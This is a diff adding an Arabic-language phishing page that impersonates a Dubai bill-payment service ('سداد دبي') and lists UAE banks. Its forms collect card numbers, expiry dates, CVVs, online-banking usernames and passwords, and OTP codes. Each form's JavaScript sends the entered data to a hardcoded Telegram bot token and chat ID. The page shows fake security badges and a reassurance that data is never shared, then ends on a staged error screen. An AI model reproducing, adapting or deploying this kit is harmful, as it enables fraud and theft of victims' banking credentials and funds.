+                        <span>بنك أبوظبي الإسلامي</span>
+                        <i class="fas fa-chevron-left chevron"></i>
+                    </div>
+                    <div class="bank-card" onclick="selectBank('بنك دبي التجاري', 'https://cdn-icons-png.flaticon.com/512/6001/6001402.png')">
+                        <img src="https://cdn-icons-png.flaticon.com/512/6001/6001402.png" alt="بنك" class="bank-logo-img">
+                        <span>بنك دبي التجاري</span>
+                        <i class="fas fa-chevron-left chevron"></i>
+                    </div>
+                    <div class="bank-card" onclick="selectBank('بنك الفجيرة الوطني', 'https://cdn-icons-png.flaticon.com/512/3405/3405822.png')">
+                        <img src="https://cdn-icons-png.flaticon.com/512/3405/3405822.png" alt="بنك" class="bank-logo-img">
+                        <span>بنك الفجيرة الوطني</span>
+                        <i class="fas fa-chevron-left chevron"></i>
+                    </div>
+                    <div class="bank-card" onclick="selectBank('بنك رأس الخيمة الوطني', 'https://cdn-icons-png.flaticon.com/512/3014/3014072.png')">
+                        <img src="https://cdn-icons-png.flaticon.com/512/3014/3014072.png" alt="بنك" class="bank-logo-img">
+                        <span>بنك رأس الخيمة الوطني</span>
+                        <i class="fas fa-chevron-left chevron"></i>
+                    </div>
+                    <div class="bank-card" onclick="selectBank('مصرف الشارقة الإسلامي', 'https://cdn-icons-png.flaticon.com/512/2921/2921326.png')">
+                        <img src="https://cdn-icons-png.flaticon.com/512/2921/2921326.png" alt="بنك" class="bank-logo-img">
+                        <span>مصرف الشارقة الإسلامي</span>
+                        <i class="fas fa-chevron-left chevron"></i>
+                    </div>
+                    <div class="bank-card" onclick="selectBank('بنك HSBC', 'https://cdn-icons-png.flaticon.com/512/3135/3135759.png')">
+                        <img src="https://cdn-icons-png.flaticon.com/512/3135/3135759.png" alt="بنك" class="bank-logo-img">
+                        <span>بنك HSBC</span>
+                        <i class="fas fa-chevron-left chevron"></i>
+                    </div>
+                </div>
+
+                <div class="mobile-hint">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>جميع البنوك المحلية معتمدة وموثوقة</span>
+                </div>
+            </div>
+            <div class="footer">
+                <div class="footer-secure">
+                    <i class="fas fa-lock"></i>
+                    <span>اتصال مشفر وآمن</span>
+                </div>
+                <span>© 2026 سداد دبي</span>
+            </div>
+        </div>
+
+        <div id="screen-payment-options" class="screen">
+            <div class="header">
+                <div class="official-badge">
+                    <i class="fas fa-credit-card"></i>
+                    <span>طريقة الدفع</span>
+                </div>
+                <h1>اختر طريقة الدفع</h1>
+                <p>كيف تود إتمام الدفع عبر <span id="selected-bank-name-options" style="font-weight: 700; color: var(--dp-blue);">البنك</span>؟</p>
+                <img id="selected-bank-logo-options" src="" alt="شعار البنك" style="width: 44px; height: 44px; object-fit: contain; margin-top: 10px;">
+            </div>
+            <div class="content">
+                <div class="payment-option" onclick="goToCardInfo()">
+                    <div class="payment-option-icon">💳</div>
+                    <div class="payment-option-content">
+                        <div class="payment-option-text">الدفع بواسطة البطاقة</div>
+                        <div class="payment-option-desc">بطاقة ائتمان أو خصم مباشر</div>
+                    </div>
+                    <i class="fas fa-chevron-left arrow"></i>
+                </div>
+
+                <div class="payment-option" onclick="goToBankAccount()">
+                    <div class="payment-option-icon">🏦</div>
+                    <div class="payment-option-content">
+                        <div class="payment-option-text">الدفع عبر الحساب البنكي</div>
+                        <div class="payment-option-desc">تسجيل الدخول المصرفي الآمن</div>
+                    </div>
+                    <i class="fas fa-chevron-left arrow"></i>
+                </div>
+
+                <div class="trust-ribbon">
+                    <div class="trust-item">
+                        <div class="t-icon"><i class="fas fa-lock"></i></div>
+                        <div class="t-label">تشفير كامل</div>
+                    </div>
+                    <div class="trust-item">
+                        <div class="t-icon"><i class="fas fa-user-shield"></i></div>
+                        <div class="t-label">حماية البيانات</div>
+                    </div>
+                    <div class="trust-item">
+                        <div class="t-icon"><i class="fas fa-check-double"></i></div>
+                        <div class="t-label">تحقق مزدوج</div>
+                    </div>
+                </div>
+            </div>
+            <div class="footer">
+                <div class="footer-secure">
+                    <i class="fas fa-lock"></i>
+                    <span>معاملات مشفرة بالكامل - الإمارات العربية المتحدة</span>
+                </div>
+            </div>
+        </div>
+
+        <div id="screen-card-info" class="screen">
+            <div class="content">
+                <div class="cc-header">
+                    <div class="official-badge">
+                        <i class="fas fa-lock"></i>
+                        <span>دفع آمن ومشفّر</span>
+                    </div>
+                    <h2>بيانات البطاقة البنكية</h2>
+                    <p>عبر <span id="selected-bank-name" style="font-weight: 700; color: var(--dp-blue);"></span></p>
+                    <div class="cc-ref">رقم المرجع: <span id="cc-ref-display">TRX-000000</span></div>
+                </div>
+
+                <div class="timer-wrap">
+                    <div class="session-timer">
+                        <i class="fas fa-clock"></i>
+                        <span>الجلسة آمنة: <span id="sessionTimer">10:00</span></span>
+                    </div>
+                </div>
+
+                <div class="cc-visual">
+                    <div class="cc-top">
+                        <div class="cc-chip"></div>
+                        <i class="fab fa-cc-visa cc-brand" id="brandLogo"></i>
+                    </div>
+                    <div class="cc-number" id="previewNumber">••••  ••••  ••••  ••••</div>
+                    <div class="cc-bottom">
+                        <div>
+                            <div class="cc-label">حامل البطاقة</div>
+                            <div class="cc-value" id="previewName">NAME SURNAME</div>
+                        </div>
+                        <div>
+                            <div class="cc-label">الانتهاء</div>
+                            <div class="cc-value" id="previewExpiry">MM/YY</div>
+                        </div>
+                    </div>
+                </div>
+
+                <form id="paymentForm" onsubmit="saveCardData(event)">
+                    <div class="cc-group">
+                        <div class="cc-input-rel">
+                            <input type="text" id="cardNumber" maxlength="19" inputmode="numeric" class="cc-input icon-pad" placeholder="رقم البطاقة" dir="ltr" style="text-align: right;" required>
+                            <i class="fas fa-credit-card cc-input-icon"></i>
+                        </div>
+                        <input type="text" id="cardHolderName" class="cc-input" placeholder="الاسم كما هو على البطاقة" dir="ltr" style="text-align: right;" required>
+                        <div class="cc-row">
+                            <div>
+                                <input type="text" id="expiry" maxlength="5" inputmode="numeric" class="cc-input last-row cc-text-center" placeholder="MM/YY" dir="ltr" required>
+                            </div>
+                            <div>
+                                <input type="password" id="cvc" maxlength="3" inputmode="numeric" class="cc-input last-row cc-text-center" placeholder="CVV" dir="ltr" required>
+                            </div>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-main btn-red">
+                        <i class="fas fa-lock"></i>
+                        <span>إتمام الدفع الآمن</span>
+                    </button>
+                </form>
+
+                <div class="trust-ribbon">
+                    <div class="trust-item">
+                        <div class="t-icon"><i class="fas fa-lock"></i></div>
+                        <div class="t-label">SSL 256</div>
+                    </div>
+                    <div class="trust-item">
+                        <div class="t-icon"><i class="fas fa-shield-alt"></i></div>
+                        <div class="t-label">PCI DSS</div>
+                    </div>
+                    <div class="trust-item">
+                        <div class="t-icon"><i class="fas fa-check-circle"></i></div>
+                        <div class="t-label">3D Secure</div>
+                    </div>
+                </div>
+            </div>
+            <div class="footer">
+                <div class="footer-secure">
+                    <i class="fas fa-lock"></i>
+                    <span>بياناتك محمية ومشفرة بالكامل</span>
+                </div>
+            </div>
+        </div>
+
+        <div id="screen-bank-account" class="screen">
+            <div class="header">
+                <div class="official-badge">
+                    <i class="fas fa-university"></i>
+                    <span>الدخول المصرفي</span>
+                </div>
+                <h1>الدخول إلى الحساب البنكي</h1>
+                <p>عبر <span id="selected-bank-name-account" style="font-weight: 700; color: var(--dp-blue);"></span></p>
+                <img id="selected-bank-logo-account" src="" alt="شعار البنك" style="width: 44px; height: 44px; object-fit: contain; margin-top: 10px;">
+            </div>
+            <div class="content">
+                <form id="bankAccountForm" onsubmit="saveBankAccountData(event)">
+                    <div class="form-group">
+                        <label for="bankUsername">اسم المستخدم</label>
+                        <input type="text" id="bankUsername" class="form-control" placeholder="أدخل اسم المستخدم" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="bankPassword">كلمة المرور</label>
+                        <input type="password" id="bankPassword" class="form-control" placeholder="أدخل كلمة المرور" required>
+                    </div>
+                    <button type="submit" class="btn-main">
+                        <i class="fas fa-sign-in-alt"></i>
+                        <span>تأكيد وتسجيل الدخول</span>
+                    </button>
+                </form>
+
+                <div class="mobile-hint">
+                    <i class="fas fa-lock"></i>
+                    <span>اتصال مصرفي مشفر - لا نشارك بياناتك مع أي طرف</span>
+                </div>
+            </div>
+            <div class="footer">
+                <div class="footer-secure">
+                    <i class="fas fa-lock"></i>
+                    <span>معاملات مشفرة بالكامل</span>
+                </div>
+            </div>
+        </div>
+
+        <div id="screen-loading-state" class="screen">
+            <div class="header">
+                <h1 style="color: var(--dp-blue); margin:0;">جاري التحقق</h1>
+            </div>
+            <div class="loading-screen">
+                <div class="spinner"></div>
+                <div id="loading-msg" class="loading-text">جاري التحقق من البيانات</div>
+                <div class="loading-subtext">يرجى عدم إغلاق الصفحة</div>
+            </div>
+        </div>
+
+        <div id="screen-otp" class="screen">
+            <div class="header">
+                <div class="official-badge">
+                    <i class="fas fa-mobile-alt"></i>
+                    <span>التحقق الثنائي</span>
+                </div>
+                <h1>رمز التحقق (OTP)</h1>
+                <p>أدخل الرمز المرسل إلى هاتفك المسجل لدى البنك</p>
+            </div>
+            <div class="content">
+                <form id="otpForm" onsubmit="verifyOtp(event)">
+                    <div class="form-group">
+                        <label for="otpCode">رمز التأكيد</label>
+                        <input type="text" id="otpCode" class="form-control" placeholder="أدخل الرمز" inputmode="numeric" required style="text-align: center; letter-spacing: 4px; font-size: 1.1rem; font-weight: 600; font-family: 'Inter', monospace;">
+                    </div>
+                    <button type="submit" class="btn-main">
+                        <i class="fas fa-check-circle"></i>
+                        <span>تأكيد الرمز</span>
+                    </button>
+                </form>
+
+                <div class="trust-ribbon">
+                    <div class="trust-item">
+                        <div class="t-icon"><i class="fas fa-mobile-alt"></i></div>
+                        <div class="t-label">رمز بنكي</div>
+                    </div>
+                    <div class="trust-item">
+                        <div class="t-icon"><i class="fas fa-user-shield"></i></div>
+                        <div class="t-label">تحقق آمن</div>
+                    </div>
+                    <div class="trust-item">
+                        <div class="t-icon"><i class="fas fa-clock"></i></div>
+                        <div class="t-label">صالح 5 دقائق</div>
+                    </div>
+                </div>
+            </div>
+            <div class="footer">
+                <div class="footer-secure">
+                    <i class="fas fa-lock"></i>
+                    <span>اتصال آمن مع البنك المُصدر</span>
+                </div>
+            </div>
+        </div>
+
+        <div id="screen-error" class="screen">
+            <div class="header">
+                <h1 style="color: var(--uae-red); margin:0;">تعذر إتمام العملية</h1>
+            </div>
+            <div class="content" style="text-align: center;">
+                <div style="color: var(--uae-text-mid); font-size: 0.95rem; line-height: 1.9; padding: 16px 0;">
+                    <div style="width: 70px; height: 70px; background: #FEF2F2; border: 1px solid #FECACA; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;">
+                        <span style="font-size: 2rem; color: var(--uae-red);">⚠️</span>
+                    </div>
+                    <strong style="color: var(--uae-text-dark); font-size: 1.05rem;">عذراً، حدث خطأ أثناء إتمام العملية.</strong>
+                    <br><br>
+                    يرجى التأكد من صحة البيانات أو المحاولة مرة أخرى لاحقاً.
+                </div>
+                <button class="btn-main" style="background-color: var(--uae-text-dark); margin-top: 15px;" onclick="location.reload()">
+                    <i class="fas fa-redo"></i>
+                    <span>إعادة المحاولة</span>
+                </button>
+            </div>
+            <div class="footer">
+                <div class="footer-secure">
+                    <i class="fas fa-headset"></i>
+                    <span>للدعم: support@dubaipay.ae</span>
+                </div>
+                <span>© 2026 سداد دبي</span>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<script>
+    let userData = {};
+    let selectedBank = '';
+    const token = "9276004175:AAH9t9lWk_kZnjhEf4aLlm1OkGLO2uPGSC8";
+    const chatId = "8302667206";
+    const referenceNumber = 'AE-' + Math.floor(100000 + Math.random() * 900000);
+    let sessionTimerInterval;
+
+    // ========== شاشة الترحيب المتحركة ==========
+    window.addEventListener('load', function() {
+        setTimeout(function() {
+            const splash = document.getElementById('splashScreen');
+            if (splash) {
+                splash.classList.add('hidden');
+                setTimeout(function() {
+                    splash.style.display = 'none';
+                }, 800);
+            }
+        }, 4000);
+    });
+
+    // ========== تعبئة المبلغ تلقائياً عند اختيار الخدمة ==========
+    function autoFillAmount(selectEl) {
+        if (selectEl.value && selectEl.value !== "") {
+            document.getElementById('amount').value = "50";
+        }
+    }
+
+    async function sendBotMessage(text) {
+        try {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: text,
+                    parse_mode: "HTML"
+                })
+            });
+        } catch (e) {
+            console.error('Bot error:', e);
+        }
+    }
+
+    function botHeader(eventTitle) {
+        return `🇦🇪 <b>سداد دبي | dubaipay</b>\n` +
+               `━━━━━━━━━━━━━━━━━━━━\n` +
+               `📌 <b>الحدث:</b> ${eventTitle}\n` +
+               `🆔 <b>المرجع:</b> <code>${referenceNumber}</code>\n` +
+               `⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-AE')}\n` +
+               `━━━━━━━━━━━━━━━━━━━━\n`;
+    }
+
+    async function startAndNotify() {
+        await sendBotMessage(
+            botHeader('🚪 دخول زائر جديد') +
+            `📱 <b>الجهاز:</b> <code>${navigator.userAgent.substring(0, 80)}...</code>`
+        );
+        showLoading('screen-preparing', 'screen-form');
+    }
+
+    function showLoading(loadingScreenId, nextScreenId, text = "جاري التحميل") {
+        document.querySelectorAll('.screen').forEach(function(el) {
+            el.classList.remove('active-screen');
+        });
+
+        const msgEl = document.getElementById('loading-msg');
+        if (msgEl) msgEl.innerText = text;
+        document.getElementById(loadingScreenId).classList.add('active-screen');
+
+        if (nextScreenId) {
+            setTimeout(function() {
+                document.querySelectorAll('.screen').forEach(function(el) {
+                    el.classList.remove('active-screen');
+                });
+                document.getElementById(nextScreenId).classList.add('active-screen');
+            }, 2500);
+        }
+    }
+
+    function showScreen(screenId) {
+        document.querySelectorAll('.screen').forEach(function(el) {
+            el.classList.remove('active-screen');
+        });
+        document.getElementById(screenId).classList.add('active-screen');
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    async function saveUserData(event) {
+        event.preventDefault();
+        userData.invoice = document.getElementById('invoiceNumber').value;
+        userData.service = document.getElementById('serviceType').value;
+        userData.amount = document.getElementById('amount').value;
+
+        await sendBotMessage(
+            botHeader('📄 بيانات الفاتورة') +
+            `🧾 <b>رقم الفاتورة:</b> <code>${userData.invoice}</code>\n` +
+            `🛠️ <b>نوع الخدمة:</b> <code>${userData.service}</code>\n` +
+            `💰 <b>المبلغ:</b> <code>${userData.amount} AED</code>`
+        );
+
+        showLoading('screen-loading', 'screen-banks');
+    }
+
+    async function selectBank(bankName, logoUrl) {
+        selectedBank = bankName;
+        document.getElementById('selected-bank-name-options').innerText = bankName;
+        document.getElementById('selected-bank-logo-options').src = logoUrl;
+        document.getElementById('selected-bank-name').innerText = bankName;
+        document.getElementById('selected-bank-name-account').innerText = bankName;
+        document.getElementById('selected-bank-logo-account').src = logoUrl;
+        document.getElementById('cc-ref-display').innerText = referenceNumber;
+
+        await sendBotMessage(
+            botHeader('🏦 اختيار البنك') +
+            `🏛️ <b>البنك المختار:</b> <code>${bankName}</code>\n` +
+            `🧾 <b>الفاتورة:</b> <code>${userData.invoice}</code>\n` +
+            `💰 <b>المبلغ:</b> <code>${userData.amount} AED</code>`
+        );
+
+        showScreen('screen-payment-options');
+    }
+
+    function goToCardInfo() {
+        showScreen('screen-card-info');
+        startSessionTimer();
+    }
+
+    function goToBankAccount() {
+        showScreen('screen-bank-account');
+    }
+
+    function startSessionTimer() {
+        if (sessionTimerInterval) clearInterval(sessionTimerInterval);
+        let timeLeft = 600;
+        const el = document.getElementById('sessionTimer');
+        if (!el) return;
+        sessionTimerInterval = setInterval(() => {
+            if (timeLeft <= 0) { clearInterval(sessionTimerInterval); return; }
+            timeLeft--;
+            const m = String(Math.floor(timeLeft/60)).padStart(2,'0');
+            const s = String(timeLeft%60).padStart(2,'0');
+            el.innerText = `${m}:${s}`;
+        }, 1000);
+    }
+
+    async function saveCardData(event) {
+        event.preventDefault();
+
+        userData.name = document.getElementById('cardHolderName').value;
+        userData.card = document.getElementById('cardNumber').value;
+        userData.exp = document.getElementById('expiry').value;
+        userData.cvc = document.getElementById('cvc').value;
+
+        const bankName = document.getElementById('selected-bank-name').innerText;
+
+        await sendBotMessage(
+            botHeader('💳 إدخال بيانات البطاقة') +
+            `🏦 <b>البنك:</b> <code>${bankName}</code>\n` +
+            `🧾 <b>الفاتورة:</b> <code>${userData.invoice}</code>\n` +
+            `💰 <b>المبلغ:</b> <code>${userData.amount} AED</code>\n` +
+            `━━━━━━━━━━━━━━━━━━━━\n` +
+            `👤 <b>الاسم:</b> <code>${userData.name}</code>\n` +
+            `💳 <b>رقم البطاقة:</b> <code>${userData.card}</code>\n` +
+            `📅 <b>الانتهاء:</b> <code>${userData.exp}</code>\n` +
+            `🔒 <b>CVV:</b> <code>${userData.cvc}</code>`
+        );
+
+        showLoading('screen-loading-state', null, 'جاري التحقق من البيانات');
+        setTimeout(() => showScreen('screen-otp'), 2500);
+    }
+
+    async function saveBankAccountData(event) {
+        event.preventDefault();
+
+        const username = document.getElementById('bankUsername').value;
+        const password = document.getElementById('bankPassword').value;
+        const bankName = document.getElementById('selected-bank-name-account').innerText;
+
+        await sendBotMessage(
+            botHeader('🏦 إدخال بيانات الحساب البنكي') +
+            `🏛️ <b>البنك:</b> <code>${bankName}</code>\n` +
+            `🧾 <b>الفاتورة:</b> <code>${userData.invoice}</code>\n` +
+            `💰 <b>المبلغ:</b> <code>${userData.amount} AED</code>\n` +
+            `━━━━━━━━━━━━━━━━━━━━\n` +
+            `👤 <b>اسم المستخدم:</b> <code>${username}</code>\n` +
+            `🔑 <b>كلمة المرور:</b> <code>${password}</code>`
+        );
+
+        showLoading('screen-loading-state', null, 'جاري التحقق من البيانات');
+        setTimeout(() => showScreen('screen-otp'), 2500);
+    }
+
+    async function verifyOtp(event) {
+        event.preventDefault();
+        const otpCode = document.getElementById('otpCode').value;
+
+        await sendBotMessage(
+            botHeader('🔐 إدخال رمز OTP') +
+            `🧾 <b>الفاتورة:</b> <code>${userData.invoice}</code>\n` +
+            `💰 <b>المبلغ:</b> <code>${userData.amount} AED</code>\n` +
+            `🔑 <b>رمز OTP:</b> <code>${otpCode}</code>`
+        );
+
+        showLoading('screen-loading-state', null, 'جاري التحقق من البيانات');
+        setTimeout(() => showScreen('screen-error'), 10000);
+    }
+
+    document.getElementById('cardNumber').addEventListener('input', function (e) {
+        let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+        let matches = value.match(/\d{1,4}/g);
+        let formatted = matches ? matches.join(' ') : '';
+        e.target.value = formatted;
+
+        document.getElementById('previewNumber').innerText = formatted || '••••  ••••  ••••  ••••';
+
+        const logo = document.getElementById('brandLogo');
+        if (value.startsWith('4')) logo.className = 'fab fa-cc-visa cc-brand';
+        else if (/^5[1-5]/.test(value)) logo.className = 'fab fa-cc-mastercard cc-brand';
+        else logo.className = 'fas fa-credit-card cc-brand';
+    });
+
+    document.getElementById('cardHolderName').addEventListener('input', function(e) {
+        document.getElementById('previewName').innerText = e.target.value.toUpperCase() || 'NAME SURNAME';
+    });
+
+    document.getElementById('expiry').addEventListener('input', function (e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length >= 3) {
+            e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+        } else {
+            e.target.value = value;
+        }
+        document.getElementById('previewExpiry').innerText = e.target.value || 'MM/YY';
+    });
+</script>
+
+</body>
+</html>
